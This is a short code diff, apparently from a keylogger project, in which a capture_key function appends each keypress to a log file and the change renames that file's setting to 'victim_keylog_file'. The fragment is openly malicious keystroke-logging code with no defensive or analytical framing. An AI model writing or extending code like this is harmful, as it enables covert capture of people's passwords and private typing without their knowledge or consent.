@@ -6,7 +6,7 @@ from encryption import encrypt
 
 def capture_key(event):
     keypress = event.name
-    with open(config.keylog_file, 'a') as f:
+    with open(config.victim_keylog_file, 'a') as f:
         f.write(f"{keypress}\n")
 
 
